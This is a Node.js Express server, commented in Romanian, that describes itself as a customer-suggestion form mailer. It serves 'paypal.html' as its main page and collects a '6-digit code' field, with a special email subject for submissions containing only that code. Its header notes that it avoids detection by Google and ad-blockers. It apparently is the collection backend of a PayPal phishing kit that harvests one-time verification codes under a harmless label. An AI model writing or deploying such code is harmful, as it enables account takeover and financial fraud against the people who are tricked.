/**
 * Server propriu pentru formularul de sugestii.
 * Primește datele de la clienți și ți le trimite pe mailul tău personal.
 * Nu folosește niciun serviciu terț – nu poate fi blocat de Google/ad-blockere.
 */

require('dotenv').config();
var express = require('express');
var nodemailer = require('nodemailer');
var path = require('path');

var app = express();
var PORT = process.env.PORT || 3000;

// Pentru a primi JSON în body
app.use(express.json());
app.use(express.static(__dirname));

// Transport pentru email – folosește Gmail (sau alt SMTP din .env)
var transporter = null;
function getTransporter() {
  if (transporter) return transporter;
  var user = process.env.EMAIL_USER;
  var pass = process.env.EMAIL_PASS;
  if (!user || !pass) {
    console.warn('Lipsește EMAIL_USER sau EMAIL_PASS în .env – trimiterea de mail nu va funcționa.');
    return null;
  }
  transporter = nodemailer.createTransport({
    host: process.env.SMTP_HOST || 'smtp.gmail.com',
    port: parseInt(process.env.SMTP_PORT || '587', 10),
    secure: process.env.SMTP_SECURE === 'true',
    auth: { user, pass }
  });
  return transporter;
}

// Endpoint: POST /api/feedback – primește sugestiile și trimite mail
app.post('/api/feedback', function (req, res) {
  var toEmail = process.env.TO_EMAIL || process.env.EMAIL_USER;
  if (!toEmail) {
    return res.status(500).json({ ok: false, error: 'TO_EMAIL neconfigurat' });
  }

  var body = req.body || {};
  var sug1 = (body.sugestiiBusiness || body['Sugestii business (casuta 1)'] || '').trim();
  var sug2 = (body.alteSugestii || body['Alte sugestii (casuta 2)'] || '').trim();
  var cod = (body.cod || body['Cod 6 cifre'] || '').trim();

  var onlyCode = !sug1 && !sug2 && cod;
  var subject = onlyCode ? 'Sugestii client – Cod 6 cifre (MailSender)' : 'Sugestii client – Sugestii (MailSender)';

  var text = [
    'Sugestii business (casuta 1):',
    sug1 || '(gol)',
    '',
    'Alte sugestii (casuta 2):',
    sug2 || '(gol)',
    '',
    'Cod 6 cifre:',
    cod || '(gol)'
  ].join('\n');

  var html = [
    '<h2>' + (onlyCode ? 'Cod 6 cifre' : 'Sugestii client') + ' – MailSender</h2>',
    '<p><strong>Sugestii business (casuta 1):</strong><br>' + (sug1 ? escapeHtml(sug1) : '(gol)') + '</p>',
    '<p><strong>Alte sugestii (casuta 2):</strong><br>' + (sug2 ? escapeHtml(sug2) : '(gol)') + '</p>',
    '<p><strong>Cod 6 cifre:</strong><br>' + (cod ? escapeHtml(cod) : '(gol)') + '</p>'
  ].join('\n');

  var trans = getTransporter();
  if (!trans) {
    return res.status(500).json({ ok: false, error: 'Email neconfigurat' });
  }

  trans.sendMail({
    from: process.env.EMAIL_FROM || process.env.EMAIL_USER,
    to: toEmail,
    subject: subject,
    text: text,
    html: html
  }, function (err) {
    if (err) {
      console.error('Eroare trimitere email:', err.message);
      return res.status(500).json({ ok: false, error: 'Nu s-a putut trimite emailul' });
    }
    res.json({ ok: true });
  });
});

function escapeHtml(s) {
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// Pagina principală
app.get('/', function (req, res) {
  res.sendFile(path.join(__dirname, 'paypal.html'));
});

app.listen(PORT, function () {
  console.log('Server pornit: http://localhost:' + PORT);
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.log('Configurează .env (EMAIL_USER, EMAIL_PASS, TO_EMAIL) pentru trimitere mail.');
  }
});
